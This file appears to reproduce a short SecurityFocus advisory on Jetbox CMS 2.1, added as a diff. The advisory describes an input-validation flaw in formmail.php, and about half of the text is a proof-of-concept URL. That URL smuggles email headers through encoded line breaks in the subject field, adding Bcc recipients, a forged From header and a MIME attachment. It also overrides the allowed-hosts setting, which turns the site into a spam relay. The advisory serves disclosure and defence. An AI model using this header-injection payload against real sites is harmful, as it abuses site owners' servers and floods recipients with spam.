@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/23989/info
+
+Jetbox CMS is prone to an input-validation vulnerabilitiy because it fails to adequately sanitize user-supplied input.
+
+Attackers can exploit this issue to send spam email in the context of the application.
+
+Jetbox 2.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/[JETBOX-DIRECTORY formmail.php?recipient=spam1@somedomain.com&_SETTINGS[allowed_email_hosts][]=somedomain.com&subject=Some Spam Subject%0ABcc: spam_address2@somedomain.com, spam_address2@somedomain.com, spam_address4@somedomain.com, spam_addressN@somedomain.com%0AFrom: any_address@somedomain.com%0AMIME-Version: 1.0%0AContent-Type: multipart/mixed; boundary=Hacker;%0A%0A-- Hacker%0ASome Spam Message%0A%0AContent-Type:text/html;name=any_file.html;%0AContent-Transfer-Encoding:8bit%0AContent-Disposition: attachment%0A%0AHTML File%0A%0A--Hacker--%0AOther text will be hide 
